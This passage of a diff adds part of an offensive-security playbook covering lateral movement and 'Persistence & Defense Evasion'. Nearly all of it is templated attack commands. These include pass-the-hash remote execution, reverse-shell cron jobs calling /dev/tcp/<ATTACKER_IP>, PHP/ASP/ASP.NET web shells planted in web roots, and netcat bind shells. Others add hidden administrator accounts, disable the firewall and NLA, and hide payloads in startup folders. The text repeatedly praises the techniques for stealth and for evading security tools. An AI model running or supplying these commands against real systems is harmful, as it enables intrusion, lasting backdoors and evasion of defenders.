+sc \\\\<TARGET_IP> failure <SERVICE_NAME> reset= 86400 actions= restart/60000 > /opt/sec/output/sc_failure_<TIMESTAMP>.txt
+
+# 9. Set service DACL
+sc \\\\<TARGET_IP> sdset <SERVICE_NAME> <DACL_STRING> > /opt/sec/output/sc_sdset_<TIMESTAMP>.txt
+
+# 10. Set service description
+sc \\\\<TARGET_IP> description <SERVICE_NAME> "<DESCRIPTION>" > /opt/sec/output/sc_description_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. SMBExec (Impacket)
+**Description:** SMB-based remote execution alternative to PsExec.
+
+**Why Best:** Alternative that might bypass security tools monitoring PsExec.
+
+**Mods (Commands):**
+```bash
+# 1. Interactive shell
+smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> > /opt/sec/output/smbexec_interactive_<TIMESTAMP>.txt
+
+# 2. Connect with hash
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> > /opt/sec/output/smbexec_hash_<TIMESTAMP>.txt
+
+# 3. Specify share
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -share <SHARE> > /opt/sec/output/smbexec_share_<TIMESTAMP>.txt
+
+# 4. Specify DC IP
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -dc-ip <DC_IP> > /opt/sec/output/smbexec_dc_<TIMESTAMP>.txt
+
+# 5. Debug mode
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -debug > /opt/sec/output/smbexec_debug_<TIMESTAMP>.txt
+
+# 6. No password
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -no-pass > /opt/sec/output/smbexec_nopass_<TIMESTAMP>.txt
+
+# 7. Specify SMB port
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -port <PORT> > /opt/sec/output/smbexec_port_<TIMESTAMP>.txt
+
+# 8. Set timeout
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -timeout <SECONDS> > /opt/sec/output/smbexec_timeout_<TIMESTAMP>.txt
+
+# 9. Specify shell type
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -shell-type <TYPE> > /opt/sec/output/smbexec_shell_<TIMESTAMP>.txt
+
+# 10. Save output
+smbexec.py <DOMAIN>/<USER>@<TARGET_IP> -hashes <HASH> -output /opt/sec/output/smbexec_output_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. Schtasks
+**Description:** Built-in Windows tool for scheduling tasks on remote machines.
+
+**Why Best:** "Living off the land" technique for scheduling payload execution.
+
+**Mods (Commands):**
+```bash
+# 1. Create scheduled task
+schtasks /create /s <TARGET_IP> /tn <TASK_NAME> /tr "<COMMAND>" /sc once /st <TIME> > /opt/sec/output/schtasks_create_<TIMESTAMP>.txt
+
+# 2. Run scheduled task
+schtasks /run /s <TARGET_IP> /tn <TASK_NAME> > /opt/sec/output/schtasks_run_<TIMESTAMP>.txt
+
+# 3. Force delete
+schtasks /delete /s <TARGET_IP> /tn <TASK_NAME> /f > /opt/sec/output/schtasks_delete_<TIMESTAMP>.txt
+
+# 4. Query tasks
+schtasks /query /s <TARGET_IP> > /opt/sec/output/schtasks_query_<TIMESTAMP>.txt
+
+# 5. Change task command
+schtasks /change /s <TARGET_IP> /tn <TASK_NAME> /tr "<NEW_COMMAND>" > /opt/sec/output/schtasks_change_<TIMESTAMP>.txt
+
+# 6. Recurring task (minutes)
+schtasks /create /s <TARGET_IP> /tn <TASK_NAME> /tr "<COMMAND>" /sc minute /mo <MINUTES> > /opt/sec/output/schtasks_recurring_<TIMESTAMP>.txt
+
+# 7. End running task
+schtasks /end /s <TARGET_IP> /tn <TASK_NAME> > /opt/sec/output/schtasks_end_<TIMESTAMP>.txt
+
+# 8. Show help
+schtasks /help > /opt/sec/output/schtasks_help_<TIMESTAMP>.txt
+
+# 9. Create with system account
+schtasks /create /s <TARGET_IP> /tn <TASK_NAME> /tr "<COMMAND>" /sc once /st <TIME> /ru SYSTEM > /opt/sec/output/schtasks_system_<TIMESTAMP>.txt
+
+# 10. Create with highest privileges
+schtasks /create /s <TARGET_IP> /tn <TASK_NAME> /tr "<COMMAND>" /sc once /st <TIME> /rl HIGHEST > /opt/sec/output/schtasks_highest_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. DCOM
+**Description:** Remote code execution using DCOM objects.
+
+**Why Best:** "Living off the land" technique, more stealthy than PsExec or WinRM.
+
+**Mods (Commands):**
+```bash
+# 1. Create MMC20 application instance
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<TARGET_IP>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\", $null, \"/c <COMMAND>\", \"Minimized\")" > /opt/sec/output/dcom_mmc_<TIMESTAMP>.txt
+
+# 2. Use CLSID
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID(\"<CLSID>\",\"<TARGET_IP>\")); $dcom.GetType().InvokeMember(\"<METHOD>\", [System.Reflection.BindingFlags]::InvokeMethod, $null, $dcom, $args)" > /opt/sec/output/dcom_clsid_<TIMESTAMP>.txt
+
+# 3. Shell.Application
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Shell.Application\",\"<TARGET_IP>\"))" > /opt/sec/output/dcom_shell_<TIMESTAMP>.txt
+
+# 4. ShellExecute
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Shell.Application\",\"<TARGET_IP>\")); $shell.Windows().Document.Application.ShellExecute(\"cmd\", \"/c <COMMAND>\", $null, $null, 0)" > /opt/sec/output/dcom_shellexecute_<TIMESTAMP>.txt
+
+# 5. Enumerate network shares
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Shell.Application\",\"<TARGET_IP>\")); $shell.Namespace(0x11).Items()" > /opt/sec/output/dcom_shares_<TIMESTAMP>.txt
+
+# 6. Enumerate desktop
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Shell.Application\",\"<TARGET_IP>\")); $shell.Namespace(0x0).Items()" > /opt/sec/output/dcom_desktop_<TIMESTAMP>.txt
+
+# 7. Enumerate My Documents
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Shell.Application\",\"<TARGET_IP>\")); $shell.Namespace(0x5).Items()" > /opt/sec/output/dcom_mydocs_<TIMESTAMP>.txt
+
+# 8. Use different CLSID
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"<TARGET_IP>\"))" > /opt/sec/output/dcom_clsid2_<TIMESTAMP>.txt
+
+# 9. Invoke method with arguments
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<TARGET_IP>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\", $null, \"-Command <COMMAND>\", \"Minimized\")" > /opt/sec/output/dcom_powershell_<TIMESTAMP>.txt
+
+# 10. Get shell object with verbose
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$shell = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Shell.Application\",\"<TARGET_IP>\")); $shell | Get-Member" > /opt/sec/output/dcom_verbose_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. Netsh
+**Description:** Native Windows tool for network configuration and port forwarding.
+
+**Why Best:** Create pivot points into internal network without additional software.
+
+**Mods (Commands):**
+```bash
+# 1. Add port forward
+netsh interface portproxy add v4tov4 listenport=<PORT> listenaddress=<ATTACKER_IP> connectport=<PORT> connectaddress=<TARGET_IP> > /opt/sec/output/netsh_add_<TIMESTAMP>.txt
+
+# 2. Show all port forwards
+netsh interface portproxy show all > /opt/sec/output/netsh_show_<TIMESTAMP>.txt
+
+# 3. Delete port forward
+netsh interface portproxy delete v4tov4 listenport=<PORT> listenaddress=<ATTACKER_IP> > /opt/sec/output/netsh_delete_<TIMESTAMP>.txt
+
+# 4. Reset all forwards
+netsh interface portproxy reset > /opt/sec/output/netsh_reset_<TIMESTAMP>.txt
+
+# 5. Open firewall port
+netsh advfirewall firewall add rule name="<RULE_NAME>" dir=in action=allow protocol=TCP localport=<PORT> > /opt/sec/output/netsh_firewall_<TIMESTAMP>.txt
+
+# 6. Delete firewall rule
+netsh advfirewall firewall delete rule name="<RULE_NAME>" > /opt/sec/output/netsh_firewall_delete_<TIMESTAMP>.txt
+
+# 7. Enable inbound user notification
+netsh advfirewall set currentprofile settings inboundusernotification enable > /opt/sec/output/netsh_inbound_<TIMESTAMP>.txt
+
+# 8. Enable outbound user notification
+netsh advfirewall set currentprofile settings outboundusernotification enable > /opt/sec/output/netsh_outbound_<TIMESTAMP>.txt
+
+# 9. Show current profile
+netsh advfirewall show currentprofile > /opt/sec/output/netsh_profile_<TIMESTAMP>.txt
+
+# 10. Turn off firewall (DANGEROUS - use with caution)
+netsh advfirewall set allprofiles state off > /opt/sec/output/netsh_off_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. SSH (Linux)
+**Description:** Standard secure shell protocol for remote administration.
+
+**Why Best:** Standard and reliable, already present on most Linux systems.
+
+**Mods (Commands):**
+```bash
+# 1. Connect with password
+ssh <USER>@<TARGET_IP> > /opt/sec/output/ssh_pass_<TIMESTAMP>.txt 2>&1
+
+# 2. Connect with private key
+ssh -i <PRIVATE_KEY> <USER>@<TARGET_IP> > /opt/sec/output/ssh_key_<TIMESTAMP>.txt 2>&1
+
+# 3. Run remote command
+ssh <USER>@<TARGET_IP> '<COMMAND>' > /opt/sec/output/ssh_cmd_<TIMESTAMP>.txt
+
+# 4. Local port forward
+ssh -L <LOCAL_PORT>:<REMOTE_IP>:<REMOTE_PORT> <USER>@<TARGET_IP> > /opt/sec/output/ssh_local_<TIMESTAMP>.txt 2>&1
+
+# 5. Remote port forward
+ssh -R <REMOTE_PORT>:<LOCAL_IP>:<LOCAL_PORT> <USER>@<TARGET_IP> > /opt/sec/output/ssh_remote_<TIMESTAMP>.txt 2>&1
+
+# 6. Dynamic SOCKS proxy
+ssh -D <LOCAL_PORT> <USER>@<TARGET_IP> > /opt/sec/output/ssh_socks_<TIMESTAMP>.txt 2>&1
+
+# 7. Non-interactive forward
+ssh -N -L <LOCAL_PORT>:<REMOTE_IP>:<REMOTE_PORT> <USER>@<TARGET_IP> > /opt/sec/output/ssh_n_<TIMESTAMP>.txt 2>&1
+
+# 8. Skip host key checking
+ssh -o StrictHostKeyChecking=no <USER>@<TARGET_IP> > /opt/sec/output/ssh_nocheck_<TIMESTAMP>.txt 2>&1
+
+# 9. Connect on specific port
+ssh -p <PORT> <USER>@<TARGET_IP> > /opt/sec/output/ssh_port_<TIMESTAMP>.txt 2>&1
+
+# 10. Verbose mode
+ssh -v <USER>@<TARGET_IP> > /opt/sec/output/ssh_verbose_<TIMESTAMP>.txt 2>&1
+```
+
+---
+
+## PHASE 8: PERSISTENCE & DEFENSE EVASION (★★★★★)
+
+**Description:** Maintaining access across reboots, credential changes, and avoiding detection.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. Empire (Persistence Modules)
+**Description:** Post-exploitation framework with persistence modules.
+
+**Why Best:** Centralized and modular framework for deploying various persistence methods.
+
+**Mods (Commands):**
+```bash
+# 1. Install scheduled task persistence
+empire --command "usemodule persistence/elevated/install_sshin; set TaskName <TASK_NAME>; execute; exit" > /opt/sec/output/empire_persist_task_<TIMESTAMP>.txt
+
+# 2. Run at boot
+empire --command "usemodule persistence/elevated/install_sshin; set OnBoot 1; execute; exit" > /opt/sec/output/empire_persist_boot_<TIMESTAMP>.txt
+
+# 3. Run at logon
+empire --command "usemodule persistence/elevated/install_sshin; set OnLogon 1; execute; exit" > /opt/sec/output/empire_persist_logon_<TIMESTAMP>.txt
+
+# 4. Create service persistence
+empire --command "usemodule persistence/elevated/install_sshin; set ServiceName <SERVICE_NAME>; execute; exit" > /opt/sec/output/empire_persist_service_<TIMESTAMP>.txt
+
+# 5. Add registry key
+empire --command "usemodule persistence/elevated/install_sshin; set RegistryKey <KEY>; execute; exit" > /opt/sec/output/empire_persist_registry_<TIMESTAMP>.txt
+
+# 6. Use WMI persistence
+empire --command "usemodule persistence/elevated/install_sshin; set WMI 1; execute; exit" > /opt/sec/output/empire_persist_wmi_<TIMESTAMP>.txt
+
+# 7. Add to startup folder
+empire --command "usemodule persistence/elevated/install_sshin; set StartupFolder 1; execute; exit" > /opt/sec/output/empire_persist_startup_<TIMESTAMP>.txt
+
+# 8. Use crontab (Linux)
+empire --command "usemodule persistence/elevated/install_sshin; set Crontab 1; execute; exit" > /opt/sec/output/empire_persist_cron_<TIMESTAMP>.txt
+
+# 9. Specify payload
+empire --command "usemodule persistence/elevated/install_sshin; set Executable <PAYLOAD>; execute; exit" > /opt/sec/output/empire_persist_payload_<TIMESTAMP>.txt
+
+# 10. Show available persistence modules
+empire --command "list modules | grep persistence; exit" > /opt/sec/output/empire_persist_list_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. Scheduled Tasks (schtasks)
+**Description:** Native Windows persistence via scheduled tasks.
+
+**Why Best:** Built-in Windows feature, stealthy persistence technique.
+
+**Mods (Commands):**
+```bash
+# 1. Create scheduled task for persistence
+schtasks /create /tn <TASK_NAME> /tr "<PAYLOAD>" /sc onlogon > /opt/sec/output/schtasks_persist_logon_<TIMESTAMP>.txt
+
+# 2. Create at system startup
+schtasks /create /tn <TASK_NAME> /tr "<PAYLOAD>" /sc onstart > /opt/sec/output/schtasks_persist_start_<TIMESTAMP>.txt
+
+# 3. Create daily recurring task
+schtasks /create /tn <TASK_NAME> /tr "<PAYLOAD>" /sc daily /st 02:00 > /opt/sec/output/schtasks_persist_daily_<TIMESTAMP>.txt
+
+# 4. Create hourly task
+schtasks /create /tn <TASK_NAME> /tr "<PAYLOAD>" /sc hourly > /opt/sec/output/schtasks_persist_hourly_<TIMESTAMP>.txt
+
+# 5. Run with system account
+schtasks /create /tn <TASK_NAME> /tr "<PAYLOAD>" /sc onlogon /ru SYSTEM > /opt/sec/output/schtasks_persist_system_<TIMESTAMP>.txt
+
+# 6. Highest privileges
+schtasks /create /tn <TASK_NAME> /tr "<PAYLOAD>" /sc onlogon /rl HIGHEST > /opt/sec/output/schtasks_persist_highest_<TIMESTAMP>.txt
+
+# 7. Query all tasks
+schtasks /query > /opt/sec/output/schtasks_persist_query_<TIMESTAMP>.txt
+
+# 8. Delete task
+schtasks /delete /tn <TASK_NAME> /f > /opt/sec/output/schtasks_persist_delete_<TIMESTAMP>.txt
+
+# 9. Change task command
+schtasks /change /tn <TASK_NAME> /tr "<NEW_PAYLOAD>" > /opt/sec/output/schtasks_persist_change_<TIMESTAMP>.txt
+
+# 10. Export all tasks
+schtasks /query /xml > /opt/sec/output/schtasks_persist_export_<TIMESTAMP>.xml
+```
+
+---
+
+#### 3. Registry Persistence
+**Description:** Native Windows registry persistence via built-in 'reg' tool.
+
+**Why Best:** Very common and effective method that can be easily scripted.
+
+**Mods (Commands):**
+```bash
+# 1. Run at boot (HKLM Run)
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <NAME> /t REG_SZ /d "<PAYLOAD>" /f > /opt/sec/output/reg_boot_<TIMESTAMP>.txt
+
+# 2. Run at logon (HKCU Run)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <NAME> /t REG_SZ /d "<PAYLOAD>" /f > /opt/sec/output/reg_logon_<TIMESTAMP>.txt
+
+# 3. Run once at boot
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <NAME> /t REG_SZ /d "<PAYLOAD>" /f > /opt/sec/output/reg_runonce_<TIMESTAMP>.txt
+
+# 4. Run once at logon
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <NAME> /t REG_SZ /d "<PAYLOAD>" /f > /opt/sec/output/reg_runonce_user_<TIMESTAMP>.txt
+
+# 5. Boot execute
+reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "<PAYLOAD>" /f > /opt/sec/output/reg_bootexecute_<TIMESTAMP>.txt
+
+# 6. Query boot entries
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" > /opt/sec/output/reg_query_boot_<TIMESTAMP>.txt
+
+# 7. Query logon entries
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" > /opt/sec/output/reg_query_logon_<TIMESTAMP>.txt
+
+# 8. Delete boot entry
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v <NAME> /f > /opt/sec/output/reg_delete_boot_<TIMESTAMP>.txt
+
+# 9. Delete logon entry
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <NAME> /f > /opt/sec/output/reg_delete_logon_<TIMESTAMP>.txt
+
+# 10. Export registry entries
+reg export HKLM\Software\Microsoft\Windows\CurrentVersion\Run /opt/sec/output/reg_export_<TIMESTAMP>.reg > /opt/sec/output/reg_export_log_<TIMESTAMP>.txt
+```
+
+---
+
+#### 4. Services Persistence (sc)
+**Description:** Native Windows service creation for persistence.
+
+**Why Best:** Built-in Windows feature, configurable to restart automatically.
+
+**Mods (Commands):**
+```bash
+# 1. Create service
+sc create <SERVICE_NAME> binPath= "<PAYLOAD>" start= auto > /opt/sec/output/sc_persist_create_<TIMESTAMP>.txt
+
+# 2. Start service
+sc start <SERVICE_NAME> > /opt/sec/output/sc_persist_start_<TIMESTAMP>.txt
+
+# 3. Delete service
+sc delete <SERVICE_NAME> > /opt/sec/output/sc_persist_delete_<TIMESTAMP>.txt
+
+# 4. Query service status
+sc query <SERVICE_NAME> > /opt/sec/output/sc_persist_query_<TIMESTAMP>.txt
+
+# 5. Stop service
+sc stop <SERVICE_NAME> > /opt/sec/output/sc_persist_stop_<TIMESTAMP>.txt
+
+# 6. Set service to auto-start
+sc config <SERVICE_NAME> start= auto > /opt/sec/output/sc_persist_auto_<TIMESTAMP>.txt
+
+# 7. Query service configuration
+sc qc <SERVICE_NAME> > /opt/sec/output/sc_persist_qc_<TIMESTAMP>.txt
+
+# 8. Set failure restart
+sc failure <SERVICE_NAME> reset= 86400 actions= restart/60000 > /opt/sec/output/sc_persist_failure_<TIMESTAMP>.txt
+
+# 9. Set service description
+sc description <SERVICE_NAME> "<DESCRIPTION>" > /opt/sec/output/sc_persist_desc_<TIMESTAMP>.txt
+
+# 10. Create service with delayed auto-start
+sc config <SERVICE_NAME> start= delayed-auto > /opt/sec/output/sc_persist_delayed_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. Startup Folder
+**Description:** Windows Startup folder persistence for every user login.
+
+**Why Best:** Very simple to implement, supported on all Windows versions.
+
+**Mods (Commands):**
+```bash
+# 1. Copy to All Users Startup
+copy <PAYLOAD> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" > /opt/sec/output/startup_all_<TIMESTAMP>.txt
+
+# 2. Copy to User Startup
+copy <PAYLOAD> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" > /opt/sec/output/startup_user_<TIMESTAMP>.txt
+
+# 3. Create symbolic link
+mklink "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\<LINK_NAME>.lnk" "<PAYLOAD_PATH>" > /opt/sec/output/startup_link_<TIMESTAMP>.txt
+
+# 4. Copy batch file
+copy <PAYLOAD_BAT> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" > /opt/sec/output/startup_bat_<TIMESTAMP>.txt
+
+# 5. List startup items
+dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" > /opt/sec/output/startup_list_<TIMESTAMP>.txt
+
+# 6. Delete startup link
+del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\<LINK_NAME>.lnk" > /opt/sec/output/startup_delete_<TIMESTAMP>.txt
+
+# 7. Copy VBS script
+copy <PAYLOAD_VBS> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" > /opt/sec/output/startup_vbs_<TIMESTAMP>.txt
+
+# 8. Copy folder
+xcopy /s /i "<PAYLOAD_FOLDER>" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" > /opt/sec/output/startup_folder_<TIMESTAMP>.txt
+
+# 9. Move file
+move <PAYLOAD> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" > /opt/sec/output/startup_move_<TIMESTAMP>.txt
+
+# 10. Hide file
+attrib +h "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\<PAYLOAD>" > /opt/sec/output/startup_hide_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. RDP Enable
+**Description:** Enable RDP for persistent graphical access.
+
+**Why Best:** Built-in Windows feature providing easy and stable access.
+
+**Mods (Commands):**
+```bash
+# 1. Enable RDP
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f > /opt/sec/output/rdp_enable_<TIMESTAMP>.txt
+
+# 2. Open firewall for RDP
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes > /opt/sec/output/rdp_firewall_<TIMESTAMP>.txt
+
+# 3. Add local user for RDP
+net user <USER> <PASSWORD> /add > /opt/sec/output/rdp_user_<TIMESTAMP>.txt
+
+# 4. Add user to Administrators
+net localgroup administrators <USER> /add > /opt/sec/output/rdp_admin_<TIMESTAMP>.txt
+
+# 5. Add user to Remote Desktop Users
+net localgroup "Remote Desktop Users" <USER> /add > /opt/sec/output/rdp_rdpusers_<TIMESTAMP>.txt
+
+# 6. Disable NLA
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f > /opt/sec/output/rdp_nla_<TIMESTAMP>.txt
+
+# 7. Check RDP status
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections > /opt/sec/output/rdp_status_<TIMESTAMP>.txt
+
+# 8. Show firewall rule
+netsh advfirewall firewall show rule name="remote desktop" > /opt/sec/output/rdp_firewall_show_<TIMESTAMP>.txt
+
+# 9. Activate user
+net user <USER> /active:yes > /opt/sec/output/rdp_activate_<TIMESTAMP>.txt
+
+# 10. List administrators
+net localgroup administrators > /opt/sec/output/rdp_admins_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. Cron Jobs (Linux)
+**Description:** Linux scheduled task persistence.
+
+**Why Best:** Reliable, built-in Linux feature for establishing persistence.
+
+**Mods (Commands):**
+```bash
+# 1. List current cron jobs
+crontab -l > /opt/sec/output/cron_list_<TIMESTAMP>.txt
+
+# 2. Edit crontab
+crontab -e > /opt/sec/output/cron_edit_<TIMESTAMP>.txt 2>&1
+
+# 3. Create reverse shell cron
+echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"' | crontab - > /opt/sec/output/cron_shell_<TIMESTAMP>.txt
+
+# 4. Run at reboot
+echo '@reboot /bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"' | crontab - > /opt/sec/output/cron_reboot_<TIMESTAMP>.txt
+
+# 5. Remove all cron jobs
+crontab -r > /opt/sec/output/cron_remove_<TIMESTAMP>.txt
+
+# 6. List jobs for specific user
+crontab -u <USER> -l > /opt/sec/output/cron_user_<TIMESTAMP>.txt
+
+# 7. Edit jobs for specific user
+crontab -u <USER> -e > /opt/sec/output/cron_user_edit_<TIMESTAMP>.txt 2>&1
+
+# 8. Run daily at 2AM
+echo '0 2 * * * /bin/bash /path/to/payload.sh' | crontab - > /opt/sec/output/cron_daily_<TIMESTAMP>.txt
+
+# 9. Run every 5 minutes
+echo '*/5 * * * * /bin/bash /path/to/payload.sh' | crontab - > /opt/sec/output/cron_five_<TIMESTAMP>.txt
+
+# 10. Backup cron jobs
+crontab -l > /opt/sec/output/cron_backup_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. SSH Keys (Linux)
+**Description:** Add public SSH key for persistent passwordless access.
+
+**Why Best:** Very common and stealthy way to maintain access on Linux systems.
+
+**Mods (Commands):**
+```bash
+# 1. Create SSH directory
+mkdir -p ~/.ssh > /opt/sec/output/sshkey_mkdir_<TIMESTAMP>.txt
+
+# 2. Add public key
+echo "<PUBLIC_KEY>" >> ~/.ssh/authorized_keys > /opt/sec/output/sshkey_add_<TIMESTAMP>.txt
+
+# 3. Set proper permissions
+chmod 700 ~/.ssh > /opt/sec/output/sshkey_chmod_dir_<TIMESTAMP>.txt
+
+# 4. Set file permissions
+chmod 600 ~/.ssh/authorized_keys > /opt/sec/output/sshkey_chmod_file_<TIMESTAMP>.txt
+
+# 5. Connect with key
+ssh -i <PRIVATE_KEY> <USER>@<TARGET_IP> > /opt/sec/output/sshkey_connect_<TIMESTAMP>.txt 2>&1
+
+# 6. View authorized keys
+cat ~/.ssh/authorized_keys > /opt/sec/output/sshkey_view_<TIMESTAMP>.txt
+
+# 7. Copy key to remote
+ssh-copy-id -i <PUBLIC_KEY_FILE> <USER>@<TARGET_IP> > /opt/sec/output/sshkey_copy_<TIMESTAMP>.txt
+
+# 8. Copy via SCP
+scp <PUBLIC_KEY_FILE> <USER>@<TARGET_IP>:~/.ssh/authorized_keys > /opt/sec/output/sshkey_scp_<TIMESTAMP>.txt
+
+# 9. Add to known hosts
+ssh-keyscan -H <TARGET_IP> >> ~/.ssh/known_hosts > /opt/sec/output/sshkey_known_<TIMESTAMP>.txt
+
+# 10. Generate new key pair
+ssh-keygen -t rsa -b 4096 -f /opt/sec/output/sshkey_key_<TIMESTAMP> > /opt/sec/output/sshkey_gen_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. Web Shells
+**Description:** PHP/ASP scripts on web servers for persistent remote access.
+
+**Why Best:** Simple to deploy, provides persistent access to compromised web servers.
+
+**Mods (Commands):**
+```bash
+# 1. Create PHP shell
+echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell_<TIMESTAMP>.php > /opt/sec/output/webshell_php_<TIMESTAMP>.txt
+
+# 2. Execute command via PHP shell
+curl http://<TARGET_IP>/shell_<TIMESTAMP>.php?cmd=id > /opt/sec/output/webshell_exec_<TIMESTAMP>.txt
+
+# 3. Create ASP shell
+echo '<% eval request("cmd") %>' > C:\inetpub\wwwroot\shell_<TIMESTAMP>.asp > /opt/sec/output/webshell_asp_<TIMESTAMP>.txt
+
+# 4. Execute command via ASP shell
+curl http://<TARGET_IP>/shell_<TIMESTAMP>.asp?cmd=whoami > /opt/sec/output/webshell_asp_exec_<TIMESTAMP>.txt
+
+# 5. Passthru PHP shell
+echo '<?php passthru($_GET["cmd"]); ?>' > /var/www/html/shell_<TIMESTAMP>.php > /opt/sec/output/webshell_passthru_<TIMESTAMP>.txt
+
+# 6. Find other shells
+find / -name "*.php" -exec grep -l "system.*_GET" {} \; > /opt/sec/output/webshell_find_<TIMESTAMP>.txt
+
+# 7. Set permissions
+chmod 755 /var/www/html/shell_<TIMESTAMP>.php > /opt/sec/output/webshell_chmod_<TIMESTAMP>.txt
+
+# 8. Create self-writing shell
+echo '<?php file_put_contents("shell_<TIMESTAMP>.php", "<?php system($_GET[\"cmd\"]); ?>"); ?>' > /var/www/html/shell_<TIMESTAMP>.php > /opt/sec/output/webshell_self_<TIMESTAMP>.txt
+
+# 9. Execute command via self shell
+curl http://<TARGET_IP>/shell_<TIMESTAMP>.php?cmd=whoami > /opt/sec/output/webshell_self_exec_<TIMESTAMP>.txt
+
+# 10. ASP.NET shell
+echo '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(Request["cmd"], "").StandardOutput.ReadToEnd()); %>' > C:\inetpub\wwwroot\shell_<TIMESTAMP>.aspx > /opt/sec/output/webshell_aspnet_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. Netcat Listener
+**Description:** Netcat listener for persistent backdoor access.
+
+**Why Best:** Simple one-command tool providing persistent backdoor.
+
+**Mods (Commands):**
+```bash
+# 1. Linux: Keep listening and execute shell
+nc -lk -p <PORT> -e /bin/sh > /opt/sec/output/nc_linux_<TIMESTAMP>.txt 2>&1
+
+# 2. Windows: Keep listening and execute cmd
+nc -lk -p <PORT> -e cmd.exe > /opt/sec/output/nc_windows_<TIMESTAMP>.txt 2>&1
+
+# 3. Keep listener alive
+nc -l -p <PORT> -k > /opt/sec/output/nc_keep_<TIMESTAMP>.txt 2>&1
+
+# 4. Linux: Execute bash shell
+nc -l -p <PORT> -e /bin/bash > /opt/sec/output/nc_bash_<TIMESTAMP>.txt 2>&1
+
+# 5. Windows: Execute PowerShell
+nc -l -p <PORT> -e powershell.exe > /opt/sec/output/nc_powershell_<TIMESTAMP>.txt 2>&1
+
+# 6. Verbose output
+nc -l -p <PORT> -v > /opt/sec/output/nc_verbose_<TIMESTAMP>.txt 2>&1
+
+# 7. Set timeout
+nc -l -p <PORT> -w <SECONDS> > /opt/sec/output/nc_timeout_<TIMESTAMP>.txt 2>&1
+
+# 8. Use UDP
+nc -l -p <PORT> -u > /opt/sec/output/nc_udp_<TIMESTAMP>.txt 2>&1
+
